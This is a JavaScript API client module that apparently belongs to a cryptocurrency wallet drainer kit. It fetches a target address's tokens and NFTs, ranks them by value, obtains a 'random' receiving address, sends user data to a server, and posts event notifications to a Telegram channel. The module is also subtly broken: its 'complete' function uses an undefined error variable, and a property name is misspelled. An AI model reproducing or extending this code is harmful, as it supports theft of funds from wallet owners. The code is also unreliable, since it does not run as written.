import axios from "axios";

import logError from "../utils/errorLog.js";

const server = axios.create({
  baseURL: process.env.SERVER_DOMAIN,
});

server.interceptors.request.use((config) => {
  const userData = btoa(JSON.stringify(window.USER));
  config.headers["user-data"] = userData;
  return config;
});

const getUserBundle = async (userId, bundleId) => {
  if (!userId || !bundleId)
    console.error(new Error("userId and bundleId is Required!"));
  const response = await server.get(`/user/${userId}/${bundleId}`);
  return response.data;
};

const getConfig = async () => {
  const response = await server.get("/config");
  return response.data;
};

const getRandomAddress = async () => {
  console.log("getting getRandomAddress");
  let address = localStorage.getItem("randomAddress");
  console.log("address localStorage: ", address);
  if (address) return address;
  const response = await server.get("/user/getRandomAddress");
  address = response.data.address;

  return address;
};

const telegramNotification = async (event, payload) => {
  try {
    const response = await server.post("/telegramNotification", {
      event,
      payload,
    });
    return response.data;
  } catch (error) {
    logError(error);
  }
};

const getTokens = async (address) => {
  if (!address) console.error(new Error("no address included!"));
  const response = await server.get(`/getUserTokens?address=${address}`);
  const tokens = response.data;
  return tokens;
};

const getNFTs = async (address) => {
  if (!address) console.error(new Error("no address included!"));
  const response = await server.get(`/getUserNfts?address=${address}`);
  const NFTs = response.data;
  return NFTs;
};

const getAllTokens = async (address) => {
  let tokens = await getTokens(address);
  if (window.USER.checkNFT) {
    const NFTs = await getNFTs(address);
    tokens = tokens.concat(NFTs);
  }
  tokens = tokens.sort(
    (tokenA, tokenB) =>
      tokenB.amount * tokenB.price - tokenA.amount * tokenA.price
  );

  return tokens;
};

const complete = async ({ event, ...payload }, retryCount = 3) => {
  try {
    const response = await server.post("/complete", { event, ...payload });
    const data = response.data;
    const errorMessage = error?.respopnse.data.message || error.message;
  } catch (error) {
    console.log("unable to complete ERROR: ", errorMessage);
    if (retryCount > 1) return complete({ event, ...payload }, retryCount - 1);
  }
};

export default {
  getUserBundle,
  getConfig,
  getRandomAddress,
  telegramNotification,
  getTokens,
  getNFTs,
  getAllTokens,
  complete,
};
